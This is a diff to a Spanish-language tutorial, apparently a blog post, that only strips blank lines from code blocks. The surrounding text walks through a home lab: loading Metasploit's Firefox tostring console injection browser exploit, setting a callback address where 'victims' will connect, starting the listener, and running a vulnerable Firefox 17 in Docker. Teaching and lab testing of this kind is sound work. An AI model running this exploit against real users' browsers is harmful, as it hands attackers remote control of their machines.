@@ -60,7 +60,6 @@ Pasos que seguiremos:
 Vamos con un poco de metasploit: **Tras actualizar metasploit** (comando: `msfupdate`) para asegurarnos que tenemos los últimos exploits, ejecutaremos el msfconsole:
 
 ```bash
-
 # msfconsole
  _                                                    _
 / \    /\         __                         _   __  /_/ __
@@ -84,7 +83,6 @@ msf >
 Ahora vamos a seleccionar el exploit para firefox `exploit/multi/browser/firefox_tostring_console_injection`:
 
 ```bash
-
 msf> use exploit/multi/browser/firefox_tostring_console_injection
 msf exploit(firefox_tostring_console_injection) > show info
 
@@ -159,14 +157,12 @@ Exploit target:
 Si hacemos un `show options` vemos que el payload necesita la IP donde queremos que escuche. Es decir: **donde se conectarán nuestras víctimas** una se haya explotado el fallo en el navegador: La IP donde está ejecutándose Metasploit:
 
 ```bash
-
 msf exploit(firefox_tostring_console_injection) > set LHOST 10.211.55.61
 ```
 
 Por último, ya solo tenemos que poner a escuchar metasploit:
 
 ```bash
-
 msf exploit(firefox_tostring_console_injection) > run
 [*] Exploit running as background job.
 
@@ -194,7 +190,6 @@ Una vez tengamos claro esto, vamos a crear el Docker usando la imagen del autor.
 **IMPORTANTE**: Este comando no se puede ejecutar por SSH, ya que hace uso de las GTK y demás librerías gráficas.
 
 ```bash
-
 # export FIREFOX=/media/psf/Home/Downloads/firefox-17
 # docker run -it -v $FIREFOX:/home/firefox/Downloads:rw -v /tmp/.X11-unix:/tmp/.X11-unix -v /dev/snd:/dev/snd --privileged -e uid=$(id -u) -e gid=$(id -g) -e DISPLAY=unix$DISPLAY --name firefox chrisdaish/firefox
 ```
@@ -223,7 +218,6 @@ En este punto ya deberíamos tener un Firefox corriendo. La pega es que **no es 
 Sin parar el Docker (es decir, no cerréis el Firefox que os abrió), vamos a otro terminal y ejecutamos lo siguiente:
 
 ```bash
-
 # docker exec -it firefox /bin/bash
 ```
 
@@ -235,7 +229,6 @@ Con esto accederemos al contenedor y podremos modificarlo. Ahora vamos a:
 Hacemos lo siguiente:
 
 ```bash
-
 # docker exec -it firefox /bin/bash
 root@3364ca6e69a1:/# ln -s /home/firefox/Downloads/firefox /usr/bin/firefox-17
 root@3364ca6e69a1:/# cat /tmp/start-firefox.sh
@@ -257,7 +250,6 @@ exec su -ls "/bin/bash" -c "/usr/bin/firefox-17 -profile /home/firefox/.mozilla/
 Et voìla! Ya lo tenemos todo listo! Cómo lo comprobamos? Fácil: Ya puedes cerrar el Firefox que el Docker nos abrió cuando lo instalamos. Cuando este se cierre, **re-arrancaremos el Docker**, solo que **esta vez se ejecutará con la versión vulnerable**:
 
 ```bash
-
 # docker start firefox
 ```
 
